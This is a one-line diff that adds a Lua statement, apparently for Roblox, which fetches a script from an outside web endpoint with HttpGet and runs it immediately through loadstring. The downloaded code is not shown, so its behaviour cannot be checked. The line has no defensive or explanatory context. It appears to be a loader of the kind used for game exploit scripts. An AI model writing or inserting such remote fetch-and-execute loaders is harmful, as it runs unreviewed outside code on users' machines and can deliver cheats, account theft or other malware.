@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.lumi.new/v1/functions/p411936918378364928/getScript?id=6ae668ab9b9b8e612bfd7567"))()
